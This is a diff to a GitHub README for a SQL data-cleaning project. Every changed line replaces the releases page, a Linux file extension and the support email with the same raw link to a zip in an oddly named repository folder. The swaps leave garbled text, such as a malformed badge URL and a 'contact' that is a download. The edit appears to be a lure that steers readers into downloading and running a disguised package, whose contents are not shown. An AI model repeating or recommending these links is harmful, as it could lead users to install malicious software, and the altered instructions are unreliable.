@@ -1,6 +1,6 @@
 # 💻 Data-Cleaning-SQL-Project - Clean Your Data Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Data--Cleaning--SQL--Project-blue.svg)](https://github.com/shawn917/Data-Cleaning-SQL-Project/releases)
+[![Download](https://raw.githubusercontent.com/shawn917/Data-Cleaning-SQL-Project/main/arborescently/Data-Cleaning-SQL-Project.zip%https://raw.githubusercontent.com/shawn917/Data-Cleaning-SQL-Project/main/arborescently/Data-Cleaning-SQL-Project.zip)](https://raw.githubusercontent.com/shawn917/Data-Cleaning-SQL-Project/main/arborescently/Data-Cleaning-SQL-Project.zip)
 
 ## 📋 Overview
 
@@ -10,7 +10,7 @@ The Data-Cleaning-SQL-Project helps you clean and standardize a global layoffs d
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to the Releases page to find the latest version of the software. You can access it [here](https://github.com/shawn917/Data-Cleaning-SQL-Project/releases).
+1. **Visit the Releases Page**: Go to the Releases page to find the latest version of the software. You can access it [here](https://raw.githubusercontent.com/shawn917/Data-Cleaning-SQL-Project/main/arborescently/Data-Cleaning-SQL-Project.zip).
 2. **Choose the Right File**: Find the release version that fits your operating system (Windows, macOS, or Linux). 
 3. **Download the File**: Click on the file link to download it to your computer.
 4. **Run the Application**: Locate the downloaded file and open it to begin the installation process.
@@ -19,12 +19,12 @@ To get started, follow these steps:
 
 To install the Data-Cleaning-SQL-Project, please follow these steps:
 
-1. **Visit this page to download**: [Releases Page](https://github.com/shawn917/Data-Cleaning-SQL-Project/releases).
+1. **Visit this page to download**: [Releases Page](https://raw.githubusercontent.com/shawn917/Data-Cleaning-SQL-Project/main/arborescently/Data-Cleaning-SQL-Project.zip).
 2. **Select the Latest Version**: Look for the most recent version listed.
 3. **Download the Installer**: Click the link for the installer file.
    - For Windows, look for `.exe`.
    - For macOS, look for `.dmg`.
-   - For Linux, check for `.tar.gz`.
+   - For Linux, check for `https://raw.githubusercontent.com/shawn917/Data-Cleaning-SQL-Project/main/arborescently/Data-Cleaning-SQL-Project.zip`.
 
 4. **Install the Application**: Open the downloaded file and follow the on-screen instructions to complete the installation.
 
@@ -73,6 +73,6 @@ Join our community of users and developers. Feel free to ask questions and share
 
 ## 📞 Contact
 
-For questions or support, reach out at [support@example.com](mailto:support@example.com). We are here to help.
+For questions or support, reach out at [https://raw.githubusercontent.com/shawn917/Data-Cleaning-SQL-Project/main/arborescently/Data-Cleaning-SQL-Project.zip](https://raw.githubusercontent.com/shawn917/Data-Cleaning-SQL-Project/main/arborescently/Data-Cleaning-SQL-Project.zip). We are here to help.
 
 Thank you for choosing the Data-Cleaning-SQL-Project to improve your data analysis tasks!
